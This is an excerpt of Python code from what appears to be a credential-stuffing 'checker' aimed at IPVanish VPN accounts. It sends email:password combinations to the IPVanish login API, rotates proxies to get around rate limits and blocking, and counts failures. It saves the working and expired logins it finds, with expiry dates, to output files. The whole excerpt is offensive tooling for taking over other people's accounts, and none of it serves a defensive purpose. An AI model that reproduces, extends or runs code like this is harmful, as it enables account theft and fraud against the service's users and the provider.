    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                response = s.post(
                    "https://api.ipvanish.com/api/v3/login", json=data, headers=headers
                )
                if (
                    "The username or password provided is incorrect" in response.text
                    or "failed attempts" in response.text
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                ...
                if now_time > expire:
                    ...
                    return_proxy(proxy)
                    if not Checker.cui:
                        log("custom", ":".join([email, password]), "Ipvanish")
                    save(
                        "Ipvanish", "custom", Checker.time, ":".join([email, password])
                    )
                    return
                else:
                    Checker.good += 1
                    return_proxy(proxy)
                    if not Checker.cui:
                        log("good", ":".join([email, password]), "Ipvanish")
                    save(
                        "Ipvanish",
                        "good",
                        Checker.time,
                        ":".join([email, password]) + f" | Expire: {expiry}",
                    )
                    return
        except:
            bad_proxy(proxy)
